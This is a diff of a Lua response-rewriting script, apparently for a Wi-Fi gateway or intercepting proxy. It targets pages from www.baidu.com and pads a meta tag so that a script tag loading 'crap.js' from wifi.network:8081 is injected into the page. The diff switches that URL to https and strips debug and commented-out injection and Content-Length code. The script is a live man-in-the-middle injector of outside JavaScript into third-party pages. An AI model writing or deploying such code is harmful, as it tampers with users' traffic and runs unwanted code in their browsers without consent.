@@ -1,7 +1,7 @@
 --local zlib = require "zlib"
 --local buffer = {}
 
-local script = '<script src="http://wifi.network:8081/crap.js"></script>'
+local script = '<script src="https://wifi.network:8081/crap.js"></script>'
 local scriptLen = string.len(script)
 
 function tableLen(t)
@@ -31,31 +31,20 @@ function padding(src)
 end
 
 function modify(data, isbody, ctx, host) -- response only
-	print(isbody, ctx, host)	
+	print("================= BEGIN")
 
 	if (host == "www.baidu.com" ) then
---		if (buffer[ctx] == nil) then
-			local matched = matchHost(host, data, "<meta.->")
-			if (matched) then 
-				local dst = padding(matched)				
-				data = string.gsub(data, matched, dst)				
-				print("replace " .. ctx .. " ======= src    " .. matched .." ====== as " .. dst .. "==========\n" .. data)
-			--	buffer[ctx] = 1
-			end
---		end
+
+		local matched = matchHost(host, data, "<meta.->")
+		if (matched) then 
+			local dst = padding(matched)				
+			data = string.gsub(data, matched, dst)	
+			print("================== SUCCESS:\n" .. data)
+		end
+
 	end
 
 	data = string.gsub(data, "<head>", "<HEAD>")
-
-	--if (isbody == false) then
-		-- local len = data.gmatch(data, "Content.Length. (%d)+")()
-		-- if (len) then
-		-- 	print("replace len: " .. len .. " as : " .. (len + 31) )
-		-- 	data = string.gsub(data, "Content.Length. %d+", "Content-Length: "..(len+31))
-		-- end
-	--else
-		-- data = string.gsub(data, "</head>", '</HEAD><script src="crap.js"></script>')
-	--end
 
     return data
 end 
